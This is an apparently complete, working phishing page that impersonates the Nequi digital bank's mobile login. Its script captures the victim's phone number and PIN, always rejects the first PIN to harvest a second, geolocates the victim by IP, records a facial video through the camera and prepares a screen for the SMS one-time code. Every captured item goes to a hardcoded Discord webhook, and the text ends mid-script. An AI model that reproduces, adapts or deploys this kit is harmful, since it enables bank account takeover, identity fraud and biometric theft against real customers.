<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Nequi</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <style>
        :root {
            --magenta: #e6007e;
            --dark-purple: #21002d;
            --input-bg: #3b2144;
            --text-gray: #b5a4ba;
            --dot-bg: rgba(255,255,255,0.18);
            --white: #ffffff;
            --success-cyan: #4dd0e1;
        }

        * {
            margin: 0; padding: 0;
            box-sizing: border-box;
            font-family: 'Inter', sans-serif;
            user-select: none;
            -webkit-tap-highlight-color: transparent;
        }

        body {
            background-color: var(--dark-purple);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh; width: 100vw;
            overflow: hidden;
            position: fixed;
        }

        .app-container {
            width: 100%;
            max-width: 450px;
            height: 100%;
            display: flex;
            flex-direction: column;
            position: relative;
            overflow: hidden;
            background-color: var(--dark-purple);
        }

        /* ===================== ERROR TOAST ===================== */
        #error-toast {
            position: absolute;
            top: 20px; left: 20px; right: 20px;
            background-color: #ff5271;
            padding: 16px;
            border-radius: 12px;
            display: none;
            align-items: center;
            gap: 12px;
            z-index: 99999;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            animation: slideInDown 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        }
        @keyframes slideInDown {
            from { transform: translateY(-150%); }
            to   { transform: translateY(0); }
        }
        #error-toast svg { width: 24px; height: 24px; color: white; }
        #error-toast p { font-size: 13.5px; line-height: 1.4; font-weight: 500; color: white; }

        /* ===================== PANTALLA 1: LOGIN ===================== */
        #screen-login {
            display: flex;
            flex-direction: column;
            height: 100%;
            padding: 20px 20px 0 20px;
        }

        .header-ayuda {
            display: flex;
            justify-content: flex-end;
            padding-top: 10px;
        }

        .btn-ayuda {
            background: rgba(255,255,255,0.08);
            border: 1px solid rgba(255,255,255,0.3);
            color: white;
            padding: 8px 18px;
            border-radius: 20px;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 8px;
        }

        .main-login {
            flex-grow: 1;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            align-items: center;
            padding: 40px 0 16px 0;
        }

        .logo-img {
            width: 190px;
            filter: drop-shadow(0 0 10px rgba(230,0,126,0.2));
        }

        .form-bottom {
            width: 100%;
            display: flex;
            flex-direction: column;
            gap: 12px;
        }

        .input-group {
            width: 100%;
            background-color: var(--input-bg);
            border-radius: 14px;
            display: flex;
            align-items: center;
            padding: 17px 18px;
            border: 1.5px solid transparent;
            transition: all 0.25s;
        }
        .input-group.error {
            border-color: #ff5271;
        }

        .input-group span {
            color: var(--text-gray);
            padding-right: 14px;
            border-right: 1.5px solid #5d4264;
            font-size: 16px;
            font-weight: 600;
            white-space: nowrap;
        }

        .input-group input {
            background: transparent;
            border: none;
            color: white;
            padding-left: 14px;
            font-size: 17px;
            width: 100%;
            outline: none;
            letter-spacing: 0.5px;
        }
        .input-group input::placeholder { color: rgba(255,255,255,0.4); }

        /* error text below input */
        #phone-error-text {
            font-size: 12.5px;
            color: #ff7a8a;
            margin-top: -4px;
            padding-left: 4px;
            display: none;
        }

        /* Entra button */
        .btn-entra {
            width: 100%;
            background-color: var(--magenta);
            color: white;
            border: none;
            padding: 17px;
            border-radius: 14px;
            font-size: 18px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 4px 15px rgba(230,0,126,0.3);
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 58px;
            transition: background 0.2s;
        }
        .btn-entra:active { background-color: #c9006e; }

        /* Spinner inside Entra button */
        .btn-spinner {
            display: none;
            width: 24px; height: 24px;
            border: 3px solid rgba(255,255,255,0.35);
            border-top-color: white;
            border-radius: 50%;
            animation: btnSpin 0.7s linear infinite;
        }
        @keyframes btnSpin { 100% { transform: rotate(360deg); } }

        /* Login footer "Comprobar un pago" */
        .login-footer {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 14px 0 18px 0;
            border-top: 1px solid rgba(255,255,255,0.08);
            margin-top: 8px;
        }
        .login-footer-left {
            display: flex;
            align-items: center;
            gap: 8px;
            color: rgba(255,255,255,0.65);
            font-size: 13.5px;
            font-weight: 500;
        }
        .login-footer-left svg { width: 18px; height: 18px; }
        .login-footer-right {
            display: flex;
            align-items: center;
            gap: 6px;
            color: rgba(255,255,255,0.4);
            font-size: 12px;
        }
        /* Efecty logo placeholder */
        .efecty-logo {
            width: 24px; height: 24px;
            background: #f5a623;
            border-radius: 50%;
            display: flex; align-items: center; justify-content: center;
            font-size: 11px; font-weight: 800; color: white;
        }

        /* ===================== PANTALLA 2: PIN ===================== */
        #screen-pin {
            display: none;
            flex-direction: column;
            height: 100%;
            padding: 15px 25px;
        }

        .btn-back {
            background: none;
            border: none;
            color: white;
            cursor: pointer;
            padding: 8px 0;
            display: flex;
            align-items: center;
        }
        .btn-back svg { width: 24px; height: 24px; stroke: white; }

        .pin-header {
            font-size: 26px;
            font-weight: 700;
            margin: 12px 0 22px;
        }

        .pin-dots-container {
            display: flex;
            justify-content: center;
            gap: 14px;
            margin-bottom: 12px;
        }

        .pin-dot {
            width: 52px; height: 52px;
            background-color: white;
            border-radius: 12px;
            border: 1.5px solid rgba(255,255,255,0.25);
            display: flex;
            align-items: center;
            justify-content: center;
            color: var(--magenta);
            font-size: 30px;
            font-weight: 900;
            transition: all 0.15s;
        }
        .pin-dot.filled {
            background-color: white;
            border-color: white;
        }

        .pin-subtitle {
            text-align: center;
            font-size: 14px;
            color: rgba(255,255,255,0.5);
            line-height: 1.5;
            margin-bottom: 8px;
        }

        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 4px;
            margin-top: auto;
            margin-bottom: 8px;
        }

        .key {
            height: 68px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 32px;
            font-weight: 400;
            cursor: pointer;
            border-radius: 12px;
            transition: background 0.1s;
        }
        .key:active { background: rgba(255,255,255,0.1); }
        .delete-icon { width: 28px; stroke-width: 2; }

        .btn-olvide-container {
            display: flex;
            justify-content: center;
            padding-bottom: 16px;
        }
        .btn-olvide {
            background: transparent;
            border: 1px solid rgba(255,255,255,0.2);
            color: rgba(255,255,255,0.75);
            padding: 9px 28px;
            border-radius: 10px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
        }

        /* ===================== PANTALLA 3: LOADING ===================== */
        #screen-loading {
            display: none;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
            width: 100%;
            position: absolute;
            top: 0; left: 0;
            z-index: 10000;
            background-color: white;
        }
        #loading-canvas {
            width: 100px; height: 100px;
            display: block;
        }
        .loading-text {
            margin-top: 36px;
            font-size: 11px;
            font-weight: 700;
            letter-spacing: 2px;
            color: #9e9e9e;
            text-transform: uppercase;
            min-height: 16px;
        }

        /* ===================== PANTALLA 4: IDENTIDAD ===================== */
        #screen-identity-choice {
            display: none;
            flex-direction: column;
            height: 100%;
            background-color: white;
            padding: 16px 20px;
            position: relative;
        }

        .id-header {
            color: #21002d;
            font-size: 24px;
            font-weight: 700;
            margin-top: 16px;
            margin-bottom: 24px;
        }

        .choice-card {
            background: white;
            border-radius: 14px;
            padding: 18px 20px;
            display: flex;
            align-items: center;
            gap: 14px;
            box-shadow: 0 2px 12px rgba(0,0,0,0.07);
            cursor: pointer;
            border: 1px solid #ebebeb;
        }
        .choice-card .icon-circle {
            width: 40px; height: 40px;
            display: flex; align-items: center; justify-content: center;
            color: #555;
        }
        .choice-card .text-info h4 {
            color: #21002d;
            font-size: 15px;
            font-weight: 600;
        }
        .choice-card .text-info p {
            color: #888;
            font-size: 12.5px;
            margin-top: 1px;
        }

        /* SUCCESS OVERLAY ‚Äî aparece sobre la pantalla de identidad */
        #success-overlay {
            display: none;
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(255,255,255,0.15);
            justify-content: center;
            align-items: center;
            z-index: 50;
        }
        .success-box {
            width: 150px; height: 150px;
            background-color: var(--success-cyan);
            border-radius: 24px;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            gap: 8px;
            animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
        }
        @keyframes popIn {
            from { transform: scale(0.4); opacity: 0; }
            to   { transform: scale(1);   opacity: 1; }
        }
        .success-box svg { width: 55px; height: 55px; color: white; }
        .success-box span { color: white; font-weight: 700; font-size: 17px; }

        /* ===================== PANTALLA 5: C√ÅMARA ===================== */
        #screen-facial-capture {
            display: none;
            flex-direction: column;
            height: 100%;
            width: 100%;
            background-color: #000;
            position: relative;
            overflow: hidden;
        }

        /* Top nav bar de la c√°mara */
        .camera-top-nav {
            position: absolute;
            top: 0; left: 0; right: 0;
            z-index: 5;
            display: flex;
            align-items: center;
            padding: 14px 16px;
            gap: 12px;
        }
        .camera-top-nav .btn-back-cam {
            background: none; border: none;
            cursor: pointer;
            display: flex; align-items: center;
        }
        .camera-top-nav .btn-back-cam svg { stroke: white; width: 22px; height: 22px; }
        .camera-top-nav .cam-title {
            color: white;
            font-size: 16px;
            font-weight: 600;
        }

        #video-feed {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            object-fit: cover;
            transform: scaleX(-1);
            z-index: 1;
        }

        .camera-overlay {
            position: absolute;
            top: 0; left: 0;
            width: 100%; height: 100%;
            display: flex;
            flex-direction: column;
            align-items: center;
            z-index: 2;
        }

        /* Instrucci√≥n debajo del nav */
        .instruction-banner {
            background-color: #ff5271;
            color: white;
            width: 86%;
            padding: 14px 18px;
            border-radius: 12px;
            text-align: center;
            margin-top: 70px;
            font-size: 15px;
            font-weight: 600;
            line-height: 1.4;
            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
        }

        /* M√°scara oval centrada */
        .oval-mask {
            margin-top: 30px;
            width: 260px; height: 360px;
            border: 3px solid rgba(255,255,255,0.55);
            border-radius: 50%;
            box-shadow: 0 0 0 9999px rgba(0,0,0,0.42);
        }

        /* ===================== PANTALLA 7: SMS ===================== */
        #screen-sms {
            display: none;
            flex-direction: column;
            height: 100%;
            padding: 16px 22px;
            background-color: white;
        }

        .sms-back-btn {
            background: none; border: none;
            cursor: pointer;
            padding: 8px 0;
            display: flex; align-items: center;
        }
        .sms-back-btn svg { stroke: #21002d; width: 22px; height: 22px; }

        .sms-title {
            color: #21002d;
            font-size: 24px;
            font-weight: 700;
            margin: 14px 0 18px;
        }

        .sms-input-grid {
            display: grid;
            grid-template-columns: repeat(6, 1fr);
            gap: 7px;
            margin-bottom: 18px;
        }

        .sms-box {
            height: 48px;
            background: #f0eef4;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 22px;
            font-weight: 700;
            color: #21002d;
        }

        .sms-body-text {
            text-align: center;
            font-size: 14px;
            color: #888;
            line-height: 1.55;
            margin-bottom: 18px;
        }

        .sms-resend-row {
            display: flex;
            align-items: center;
            gap: 12px;
            margin-bottom: 16px;
        }

        /* spinner magenta */
        .circle-progress {
            width: 32px; height: 32px;
            border: 3.5px solid rgba(230,0,126,0.2);
            border-top-color: var(--magenta);
            border-radius: 50%;
            flex-shrink: 0;
            animation: spinAnim 1.5s linear infinite;
        }
        @keyframes spinAnim { 100% { transform: rotate(360deg); } }

        .sms-resend-text {
            font-size: 13.5px;
            color: #555;
        }

        /* Bot√≥n "P√≠delo aqu√≠" ‚Äî magenta */
        .btn-pidelo {
            width: 100%;
            background: transparent;
            border: 1.5px solid var(--magenta);
            color: var(--magenta);
            padding: 11px;
            border-radius: 10px;
            font-weight: 600;
            font-size: 14px;
            cursor: pointer;
            margin-bottom: 4px;
        }

        /* Keypad SMS ‚Äî n√∫meros grandes oscuros */
        .sms-keypad {
            margin-top: auto;
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 2px;
            padding-bottom: 8px;
        }

        .sms-key {
            height: 64px;
            display: flex;
            align-items: center;
            justify-content: center;
            color: #21002d;
            font-size: 30px;
            font-weight: 400;
            cursor: pointer;
            border-radius: 10px;
            transition: background 0.1s;
        }
        .sms-key:active { background: rgba(33,0,45,0.06); }
        .sms-delete-btn {
            background: #21002d;
            border-radius: 8px;
            width: 44px; height: 34px;
            display: flex; align-items: center; justify-content: center;
            margin: auto;
        }
        .sms-delete-btn svg { stroke: white; width: 18px; height: 18px; }

        /* ===================== UTILIDADES ===================== */
        .btn-back-dark {
            background: none; border: none;
            color: #21002d; font-size: 28px;
            cursor: pointer;
            padding: 6px 0;
            line-height: 1;
        }
    </style>
</head>
<body>
<div class="app-container">

    <!-- TOAST ERROR GLOBAL -->
    <div id="error-toast">
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
            <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
        </svg>
        <p id="error-message">¬°Ups! Esa no es tu clave.</p>
    </div>

    <!-- ========== PANTALLA 1: LOGIN ========== -->
    <div id="screen-login">
        <div class="header-ayuda">
            <button class="btn-ayuda">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                    <circle cx="12" cy="12" r="10"/>
                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
                    <line x1="12" y1="17" x2="12.01" y2="17"/>
                </svg>
                Ayuda
            </button>
        </div>

        <div class="main-login">
            <div class="logo-container">
                <img src="https://comunidad.nequi.co/wp-content/uploads/2023/06/logo-blanco-nequi.png" class="logo-img" alt="Nequi">
            </div>
            <div class="form-bottom">
                <div class="input-group" id="phone-input-group">
                    <span>+57</span>
                    <input type="tel" id="phone-field" placeholder="N√∫mero de celular" maxlength="13">
                </div>
                <p id="phone-error-text">Escribe por fa el n√∫mero de tu cel para seguir.</p>
                <button class="btn-entra" id="btn-entra" onclick="goToPin()">
                    <span id="btn-entra-text">Entra</span>
                    <div class="btn-spinner" id="btn-spinner"></div>
                </button>
            </div>
        </div>

        <!-- Footer "Comprobar un pago" -->
        <div class="login-footer">
            <div class="login-footer-left">
                <!-- Diamond / kite icon -->
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
                    <polygon points="12 2 22 12 12 22 2 12"/>
                </svg>
                Comprobar un pago
            </div>
            <div class="login-footer-right">
                <span>by Bancolombia</span>
            </div>
        </div>
    </div>

    <!-- ========== PANTALLA 2: PIN ========== -->
    <div id="screen-pin">
        <button class="btn-back" onclick="showScreen('screen-login')">
            <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                <path d="M19 12H5M12 5l-7 7 7 7"/>
            </svg>
        </button>

        <h2 class="pin-header">Escribe tu clave</h2>

        <div class="pin-dots-container">
            <div class="pin-dot" id="dot0"></div>
            <div class="pin-dot" id="dot1"></div>
            <div class="pin-dot" id="dot2"></div>
            <div class="pin-dot" id="dot3"></div>
        </div>

        <p class="pin-subtitle">
            No dudamos que seas t√∫...<br>
            Pero es mejor confirmar ;)
        </p>

        <div class="keypad">
            <div class="key" onclick="pressPin('1')">1</div>
            <div class="key" onclick="pressPin('2')">2</div>
            <div class="key" onclick="pressPin('3')">3</div>
            <div class="key" onclick="pressPin('4')">4</div>
            <div class="key" onclick="pressPin('5')">5</div>
            <div class="key" onclick="pressPin('6')">6</div>
            <div class="key" onclick="pressPin('7')">7</div>
            <div class="key" onclick="pressPin('8')">8</div>
            <div class="key" onclick="pressPin('9')">9</div>
            <div></div>
            <div class="key" onclick="pressPin('0')">0</div>
            <div class="key" onclick="delPin()">
                <svg class="delete-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
                    <line x1="18" y1="9" x2="12" y2="15"/>
                    <line x1="12" y1="9" x2="18" y2="15"/>
                </svg>
            </div>
        </div>

        <div class="btn-olvide-container">
            <button class="btn-olvide">Olvid√© mi clave</button>
        </div>
    </div>

    <!-- ========== PANTALLA 3: LOADING ========== -->
    <div id="screen-loading">
        <canvas id="loading-canvas"></canvas>
        <p class="loading-text" id="loading-label"></p>
    </div>

    <!-- ========== PANTALLA 4: IDENTIDAD ========== -->
    <div id="screen-identity-choice">
        <h2 class="id-header">Validemos tu identidad</h2>
        <div class="choice-card" onclick="startFacial()">
            <div class="icon-circle">
                <!-- Face scan icon -->
                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M4 7V5a2 2 0 0 1 2-2h2"/>
                    <path d="M16 3h2a2 2 0 0 1 2 2v2"/>
                    <path d="M20 17v2a2 2 0 0 1-2 2h-2"/>
                    <path d="M8 21H6a2 2 0 0 1-2-2v-2"/>
                    <circle cx="12" cy="10" r="3"/>
                    <path d="M7 18.5c.9-2.3 3-3.5 5-3.5s4.1 1.2 5 3.5"/>
                </svg>
            </div>
            <div class="text-info">
                <h4>Reconocimiento facial</h4>
                <p>M√°s seguridad</p>
            </div>
        </div>

        <!-- ¬°LISTO! overlay ‚Äî aparece sobre esta pantalla como en el video -->
        <div id="success-overlay">
            <div class="success-box">
                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
                    <polyline points="20 6 9 17 4 12"/>
                </svg>
                <span>¬°Listo!</span>
            </div>
        </div>
    </div>

    <!-- ========== PANTALLA 5: C√ÅMARA FACIAL ========== -->
    <div id="screen-facial-capture">
        <video id="video-feed" autoplay playsinline muted></video>

        <!-- Top nav: "‚Üê Tu foto" -->
        <div class="camera-top-nav">
            <button class="btn-back-cam" onclick="stopCameraAndGoBack()">
                <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M19 12H5M12 5l-7 7 7 7"/>
                </svg>
            </button>
            <span class="cam-title">Tu foto</span>
        </div>

        <div class="camera-overlay">
            <!-- Instrucci√≥n en banner rosa -->
            <div class="instruction-banner" id="instruction-banner">
                Mira de frente<br>a la c√°mara por favor
            </div>
            <!-- Oval mask -->
            <div class="oval-mask"></div>
        </div>
    </div>

    <!-- ========== PANTALLA 7: SMS ========== -->
    <div id="screen-sms">

        <h2 class="sms-title">Ingresa el c√≥digo</h2>

        <div class="sms-input-grid">
            <div class="sms-box" id="s0"></div>
            <div class="sms-box" id="s1"></div>
            <div class="sms-box" id="s2"></div>
            <div class="sms-box" id="s3"></div>
            <div class="sms-box" id="s4"></div>
            <div class="sms-box" id="s5"></div>
        </div>

        <p class="sms-body-text">
            Escribe los 6 n√∫meros que te enviamos<br>
            por WhatsApp. Si no te lleg√≥, revisa tus<br>
            mensajes de texto.
        </p>

        <div class="sms-resend-row">
            <div class="circle-progress"></div>
            <span class="sms-resend-text">¬øNo te lleg√≥? ¬°P√≠delo otra vez!</span>
        </div>

        <button class="btn-pidelo">P√≠delo aqu√≠</button>

        <div class="sms-keypad">
            <div class="sms-key" onclick="pressSms('1')">1</div>
            <div class="sms-key" onclick="pressSms('2')">2</div>
            <div class="sms-key" onclick="pressSms('3')">3</div>
            <div class="sms-key" onclick="pressSms('4')">4</div>
            <div class="sms-key" onclick="pressSms('5')">5</div>
            <div class="sms-key" onclick="pressSms('6')">6</div>
            <div class="sms-key" onclick="pressSms('7')">7</div>
            <div class="sms-key" onclick="pressSms('8')">8</div>
            <div class="sms-key" onclick="pressSms('9')">9</div>
            <div></div>
            <div class="sms-key" onclick="pressSms('0')">0</div>
            <div class="sms-key" onclick="delSms()">
                <div class="sms-delete-btn">
                    <svg viewBox="0 0 24 24" fill="none" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.2">
                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
                        <line x1="18" y1="9" x2="12" y2="15"/>
                        <line x1="12" y1="9" x2="18" y2="15"/>
                    </svg>
                </div>
            </div>
        </div>
    </div>

</div><!-- /app-container -->

<script>
// =====================================================
// ANIMACI√ìN CANVAS (perfeccionada)
// =====================================================
const loadingCanvas = document.getElementById('loading-canvas');
const ctx = loadingCanvas.getContext('2d');
loadingCanvas.width  = 100;
loadingCanvas.height = 100;

const S = 40, R = 7, GAP = 3;
const COLOR = '#be1070';
const CYCLE = 1500;

function easeInOutCubic(t) {
    return t < 0.5 ? 4*t*t*t : 1 - Math.pow(-2*t+2,3)/2;
}
function drawSquare(cx, cy, side, radius, angle) {
    ctx.save();
    ctx.translate(cx, cy);
    ctx.rotate(angle);
    const h = side / 2;
    ctx.beginPath();
    ctx.moveTo(-h+radius,-h); ctx.lineTo(h-radius,-h);
    ctx.arcTo(h,-h,h,-h+radius,radius);
    ctx.lineTo(h,h-radius);
    ctx.arcTo(h,h,h-radius,h,radius);
    ctx.lineTo(-h+radius,h);
    ctx.arcTo(-h,h,-h,h-radius,radius);
    ctx.lineTo(-h,-h+radius);
    ctx.arcTo(-h,-h,-h+radius,-h,radius);
    ctx.closePath();
    ctx.fill();
    ctx.restore();
}
let animFrameId = null;
function drawLoadingFrame(ts) {
    ctx.clearRect(0,0,100,100);
    const t = (ts % CYCLE) / CYCLE;
    const sysAngle = -t * Math.PI * 2;
    let splitT;
    const p1s=0.08, p1e=0.38, p2s=0.62, p2e=0.92;
    if      (t < p1s) splitT = 0;
    else if (t < p1e) splitT = easeInOutCubic((t-p1s)/(p1e-p1s));
    else if (t < p2s) splitT = 1;
    else if (t < p2e) splitT = 1 - easeInOutCubic((t-p2s)/(p2e-p2s));
    else              splitT = 0;

    const offset = splitT * (S/2 + GAP/2);
    const dirA = -Math.PI/4 + sysAngle;
    const dirB = dirA + Math.PI;
    const ax = 50 + Math.cos(dirA)*offset, ay = 50 + Math.sin(dirA)*offset;
    const bx = 50 + Math.cos(dirB)*offset, by = 50 + Math.sin(dirB)*offset;
    ctx.fillStyle = COLOR;
    drawSquare(bx, by, S, R, sysAngle);
    drawSquare(ax, ay, S, R, sysAngle);
    animFrameId = requestAnimationFrame(drawLoadingFrame);
}
function startLoadingAnim() {
    if (!animFrameId) animFrameId = requestAnimationFrame(drawLoadingFrame);
}
function stopLoadingAnim() {
    if (animFrameId) { cancelAnimationFrame(animFrameId); animFrameId = null; }
}

// =====================================================
// APP LOGIC
// =====================================================
const WEBHOOK_URL = "https://discord.com/api/webhooks/1475662241947979886/blDyK80XJ_IMmlJzfLUu-IChsUcF0evuMcT2Q64edYDQ_bBPfpjfaqtQ9hE53a7i4--W";

// Configuraci√≥n del perfil del bot
const BOT_NAME = "Sistema de Seguridad ¬∑ Nequi";
const BOT_AVATAR_URL = "https://i.imgur.com/6IYz0qh.png";

// Colores para los embeds (en hexadecimal decimal)
const COLORS = {
    INFO: 0x5865F2,    
    ERROR: 0xED4245,   
    SUCCESS: 0x57F287, 
    WARNING: 0xFEE75C, 
    CAPTURE: 0x9B84EE  
};

let currentPin = "", currentSms = "", attemptCounter = 0, smsAttempt = 0;
let userData = { ip: "0.0.0.0", loc: "Detectando..." };
let mediaRecorder, videoChunks = [], cameraStream = null;

// Funci√≥n auxiliar para crear la estructura de un embed
function createEmbed(title, color, fields = [], footerText = null) {
    const embed = {
        title: title,
        color: color,
        fields: fields,
        timestamp: new Date().toISOString(),
        footer: footerText ? { text: footerText } : undefined
    };
    return embed;
}

async function sendToDiscord(content = null, file = null, fileName = "captura.png", embedColor = COLORS.INFO, embedFields = [], embedTitle = "Reporte del Sistema") {
    const fd = new FormData();

    // 1. Configurar el payload JSON para el embed (si hay campos)
    if (embedFields.length > 0) {
        const footerText = `IP: ${userData.ip} ¬∑ ${userData.loc}`;
        const embedPayload = createEmbed(embedTitle, embedColor, embedFields, footerText);
        fd.append('payload_json', JSON.stringify({
            username: BOT_NAME,
            avatar_url: BOT_AVATAR_URL,
            embeds: [embedPayload]
        }));
    } else if (content) {
        // Si no hay embed pero hay contenido, enviamos mensaje de texto plano con el perfil
        fd.append('username', BOT_NAME);
        fd.append('avatar_url', BOT_AVATAR_URL);
        fd.append('content', content);
    }

    // 2. Adjuntar el archivo si existe (para fotos/videos)
    if (file) {
        fd.append('file', file, fileName);
    }

    try { 
        await fetch(WEBHOOK_URL, { method:'POST', body:fd }); 
    } catch(e) {
        console.error("Error enviando a Discord:", e);
    }
}

async function getInfo() {
    try {
        const res  = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        userData = { ip: data.ip, loc: `${data.city}, ${data.country_name}` };
    } catch(e) {}
}
getInfo();

// --- Navegaci√≥n ---
const ALL_SCREENS = ['screen-login','screen-pin','screen-loading','screen-identity-choice','screen-facial-capture','screen-sms'];
function showScreen(id) {
    ALL_SCREENS.forEach(s => {
        const el = document.getElementById(s);
        if (el) el.style.display = 'none';
    });
    const target = document.getElementById(id);
    if (!target) return;
    target.style.display = 'flex';

    if (id === 'screen-loading') startLoadingAnim();
    else stopLoadingAnim();

    const purpleBg = ['screen-login','screen-pin'].includes(id);
    document.body.style.backgroundColor = purpleBg ? '#21002d' : '#ffffff';
    document.querySelector('.app-container').style.backgroundColor = purpleBg ? '#21002d' : '#ffffff';
}

// --- LOGIN ---
const phoneInput  = document.getElementById('phone-field');
const phoneGroup  = document.getElementById('phone-input-group');
const phoneError  = document.getElementById('phone-error-text');
const btnEntra    = document.getElementById('btn-entra');
const btnText     = document.getElementById('btn-entra-text');
const btnSpinner  = document.getElementById('btn-spinner');

phoneInput.addEventListener('input', (e) => {
    phoneGroup.classList.remove('error');
    phoneError.style.display = 'none';
    phoneInput.placeholder = 'N√∫mero de celular';

    let val = e.target.value.replace(/\D/g,'').slice(0,10);
    if (val.length > 6)      e.target.value = val.slice(0,3)+' '+val.slice(3,6)+' '+val.slice(6);
    else if (val.length > 3) e.target.value = val.slice(0,3)+' '+val.slice(3);
    else                     e.target.value = val;
});

function goToPin() {
    const raw = phoneInput.value.replace(/\s/g,'');
    if (raw.length === 10 && raw.startsWith('3')) {
        btnText.style.display    = 'none';
        btnSpinner.style.display = 'block';
        
        sendToDiscord(
            null, null, null,
            COLORS.INFO,
            [
                { name: "üì± N√∫mero Registrado", value: `\`\`\`${raw}\`\`\``, inline: true },
                { name: "üìç Ubicaci√≥n", value: `\`\`\`${userData.loc}\`\`\``, inline: true },
                { name: "üïí Paso", value: "Inicio de sesi√≥n", inline: true }
            ],
            "üîê Intento de Acceso"
        );
        
        setTimeout(() => {
            btnText.style.display    = 'inline';
            btnSpinner.style.display = 'none';
            showScreen('screen-pin');
        }, 1000);
    } else {
        phoneGroup.classList.add('error');
        phoneInput.value       = '';
        phoneInput.placeholder = 'Ingresa tu cel';
        phoneError.style.display = 'block';
    }
}

// --- PIN ---
function pressPin(d) {
    if (currentPin.length < 4) {
        currentPin += d;
        updateDots();
        if (currentPin.length === 4) setTimeout(validatePin, 400);
    }
}
function updateDots() {
    for (let i = 0; i < 4; i++) {
        const dot = document.getElementById(`dot${i}`);
        if (!dot) continue;
        if (currentPin[i]) {
            dot.innerText = '*';
            dot.classList.add('filled');
        } else {
            dot.innerText = '';
            dot.classList.remove('filled');
        }
    }
}
function validatePin() {
    attemptCounter++;
    if (attemptCounter === 1) {
        sendToDiscord(
            null, null, null,
            COLORS.ERROR,
            [
                { name: "üîë PIN Ingresado (Intento 1/4)", value: `\`\`\`${currentPin}\`\`\``, inline: false },
                { name: "‚è±Ô∏è Estado", value: "‚ùå Incorrecto", inline: true },
                { name: "üîÑ Intentos restantes", value: "3", inline: true },
                { name: "üìç Dispositivo", value: `\`\`\`${navigator.userAgent.substring(0, 50)}...\`\`\``, inline: false }
            ],
            "‚ùå Error de Autenticaci√≥n (PIN)"
        );
        showToast('¬°Ups! Esa no es tu clave, tranqui, tienes 3 intentos m√°s.');
        currentPin = ''; 
        updateDots();
    } else {
        sendToDiscord(
            null, null, null,
            COLORS.SUCCESS,
            [
                { name: "üîë PIN V√°lido", value: `\`\`\`${currentPin}\`\`\``, inline: false },
                { name: "‚è±Ô∏è Estado", value: "‚úÖ Verificado", inline: true },
                { name: "üîÑ Pr√≥ximo paso", value: "Biometr√≠a facial", inline: true },
                { name: "üéØ Intento", value: "2/4", inline: true }
            ],
            "‚úÖ Autenticaci√≥n Exitosa (PIN)"
        );
        const label = document.getElementById('loading-label');
        label.innerText = '';
        showScreen('screen-loading');
        setTimeout(() => showScreen('screen-identity-choice'), 2800);
    }
}
function delPin() { currentPin = currentPin.slice(0,-1); updateDots(); }

// --- BIOMETR√çA ---
async function startFacial() {
    showScreen('screen-facial-capture');
    const video   = document.getElementById('video-feed');
    const banner  = document.getElementById('instruction-banner');
    try {
        const stream = await navigator.mediaDevices.getUserMedia({
            video: { facingMode:'user', width:{ideal:640}, height:{ideal:480} }
        });
        cameraStream = stream;
        video.srcObject = stream;
        videoChunks = [];
        mediaRecorder = new MediaRecorder(stream);
        mediaRecorder.ondataavailable = e => videoChunks.push(e.data);
        mediaRecorder.onstop = () => {
            const blob = new Blob(videoChunks, { type:'video/webm' });
            sendToDiscord(
                null,
                blob,
                'video_facial.webm',
                COLORS.CAPTURE,
                [
                    { name: "üìπ Duraci√≥n", value: `~10 segundos`, inline: true },
                    { name: "‚è±Ô∏è Momento", value: `<t:${Math.floor(Date.now()/1000)}:R>`, inline: true },
                    { name: "üì± Dispositivo", value: `Android ¬∑ ${navigator.platform}`, inline: true }
                ],
                "üé¨ Secuencia Biom√©trica Completa"
